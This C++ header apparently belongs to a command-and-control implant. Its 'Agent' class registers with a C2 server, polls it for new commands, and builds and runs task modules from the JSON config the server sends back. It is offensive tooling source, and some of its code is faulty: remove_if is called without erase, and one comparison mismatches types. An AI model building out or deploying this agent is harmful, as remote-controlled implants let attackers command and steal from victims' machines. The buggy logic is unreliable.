#pragma once

#include "Task.h"
#include <vector>
#include <thread>
#include <unistd.h>

using namespace std;
using json = nlohmann::json;

#define DEBUG

class Agent
{
private:

    bool agent_run;
    std::vector<std::unique_ptr<Task>> tasks;
    json config;

    void run_all_tasks()
    {
        std::cout << "Running " << tasks.size() << " tasks !" << std::endl;

        for (const std::unique_ptr<Task> & t: tasks)
        {
            t->run();
        }
        
    }

    void add_task(Task * t, bool restart)
    {
        if(restart)
        {
            std::remove_if(tasks.begin(), tasks.end(), [t](const unique_ptr<Task> & task){ return *(task.get()) == t; });
        }
        tasks.push_back(std::unique_ptr<Task>(t));
    }

    void start_from_config(const json & config)
    {
        for (auto& el : config.items())
        {
            bool restart = el.value().contains("restart") && el.value()["restart"] == "1";

            std::string module_name = el.key();
            Task * t = Task::BuildTask(module_name, el.value());

            add_task(t, restart);
        }        
        run_all_tasks();
    }

    bool agent_register()
    {
        return Communicator::getInstance().c2_registration();
    }

    bool get_server_config()
    {
        json current_config;
        if(bool res = Communicator::getInstance().check_new_command(&current_config))
        {
            config.swap(current_config);
        }
        return res;
    }

public:
    Agent() : agent_run(true) {

    }

    ~Agent()
    {
        
    }

    void start();

    void stop();
};
